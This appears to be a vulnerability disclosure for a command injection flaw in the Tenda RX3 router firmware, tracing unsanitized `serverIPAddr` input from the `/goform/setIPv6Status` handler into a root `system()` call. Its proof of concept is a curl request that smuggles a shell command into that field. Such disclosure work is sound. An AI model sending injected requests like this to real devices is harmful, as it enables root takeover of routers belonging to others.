| Firmware Name | Firmware Version    | Download Link |
| ------------- | ------------------- | ------------- |
| RX3           | V16.03.13.11_multi  | https://static.tenda.com.cn/tdeweb/download/RX3/US_RX3V1.0br_V16.03.13.11_multi_TDE01.zip |

## Analysis

In the httpd binary, the function `formSetIPv6status` handles requests to `/goform/setIPv6Status`. The `serverIPAddr` parameter is stored in NVRAM without sanitization. The `multiWAN` binary later uses this value in `doSystemCmd("ip tunnel add %s mode sit remote %s local %s ttl 255")`, which calls `system()`, allowing arbitrary command execution as root.

![Ghidra showing unsanitized serverIPAddr](screenshots/1.png)

## POC

```
curl -i -X POST http://192.168.0.1/goform/setIPv6Status -d "ipv6Enable=1&ipv6WanType=6in4&serverIPAddr=1.2.3.4;id>/tmp/pwned&localIPAddr=10.0.0.1"
```

![Handler accepts injected payload](screenshots/2.png)
